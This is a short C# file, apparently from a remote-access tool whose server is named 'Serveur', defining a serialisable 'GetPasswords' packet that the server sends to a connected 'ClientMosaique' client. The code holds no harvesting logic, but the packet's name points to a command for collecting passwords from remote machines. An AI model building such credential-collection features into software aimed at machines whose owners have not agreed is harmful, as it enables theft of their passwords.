using Serveur.Controllers.Server;
using ZeroFormatter;

namespace Serveur.Packets.ServerPackets
{
    [ZeroFormattable]
    public class GetPasswords :IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.GetPasswords;
            }
        }
        public GetPasswords()
        {
        }

        public void Execute(ClientMosaique client)
        {
            client.send(this);
        }
    }
}
